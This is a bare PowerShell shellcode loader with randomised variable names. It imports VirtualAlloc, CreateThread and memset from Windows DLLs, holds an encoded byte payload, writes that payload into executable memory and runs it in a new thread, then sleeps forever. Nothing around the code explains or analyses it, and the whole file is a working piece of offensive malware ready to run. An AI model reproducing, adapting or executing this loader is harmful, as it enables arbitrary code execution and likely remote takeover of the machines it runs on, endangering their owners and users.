$8kwN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8kwN -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc6,0xd9,0x74,0x24,0xf4,0xba,0xd0,0xd3,0x22,0xbe,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x2c,0x31,0xd7,0x42,0x24,0x34,0x18,0xbb,0xb4,0x59,0x90,0x5e,0x85,0x59,0xc6,0x2b,0xb5,0x69,0x8c,0x7e,0x39,0x01,0xc0,0x6a,0xca,0x67,0xcd,0x9d,0x7b,0xcd,0x2b,0x93,0x7c,0x7e,0x0f,0xb2,0xfe,0x7d,0x5c,0x14,0x3f,0x4e,0x91,0x55,0x78,0xb3,0x58,0x07,0xd1,0xbf,0xcf,0xb8,0x56,0xf5,0xd3,0x33,0x24,0x1b,0x54,0xa7,0xfc,0x1a,0x75,0x76,0x77,0x45,0x55,0x78,0x54,0xfd,0xdc,0x62,0xb9,0x38,0x96,0x19,0x09,0xb6,0x29,0xc8,0x40,0x37,0x85,0x35,0x6d,0xca,0xd7,0x72,0x49,0x35,0xa2,0x8a,0xaa,0xc8,0xb5,0x48,0xd1,0x16,0x33,0x4b,0x71,0xdc,0xe3,0xb7,0x80,0x31,0x75,0x33,0x8e,0xfe,0xf1,0x1b,0x92,0x01,0xd5,0x17,0xae,0x8a,0xd8,0xf7,0x27,0xc8,0xfe,0xd3,0x6c,0x8a,0x9f,0x42,0xc8,0x7d,0x9f,0x95,0xb3,0x22,0x05,0xdd,0x59,0x36,0x34,0xbc,0x35,0xfb,0x75,0x3f,0xc5,0x93,0x0e,0x4c,0xf7,0x3c,0xa5,0xda,0xbb,0xb5,0x63,0x1c,0xbc,0xef,0xd4,0xb2,0x43,0x10,0x25,0x9a,0x87,0x44,0x75,0xb4,0x2e,0xe5,0x1e,0x44,0xcf,0x30,0x8a,0x41,0x47,0x7b,0xe3,0x4b,0xde,0x13,0xf6,0x4b,0xf1,0xbf,0x7f,0xad,0xa1,0x6f,0xd0,0x62,0x01,0xc0,0x90,0xd2,0xe9,0x0a,0x1f,0x0c,0x09,0x35,0xf5,0x25,0xa3,0xda,0xa0,0x1e,0x5b,0x42,0xe9,0xd5,0xfa,0x8b,0x27,0x90,0x3c,0x07,0xc4,0x64,0xf2,0xe0,0xa1,0x76,0x62,0x01,0xfc,0x25,0x24,0x1e,0x2a,0x43,0xc8,0x8a,0xd1,0xc2,0x9f,0x22,0xd8,0x33,0xd7,0xec,0x23,0x16,0x6c,0x24,0xb6,0xd9,0x1a,0x49,0x56,0xda,0xda,0x1f,0x3c,0xda,0xb2,0xc7,0x64,0x89,0xa7,0x07,0xb1,0xbd,0x74,0x92,0x3a,0x94,0x29,0x35,0x53,0x1a,0x14,0x71,0xfc,0xe5,0x73,0x83,0xc0,0x33,0xbd,0xf1,0x28,0x80;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$04ef=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($04ef.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$04ef,0,0,0);for (;;){Start-sleep 60};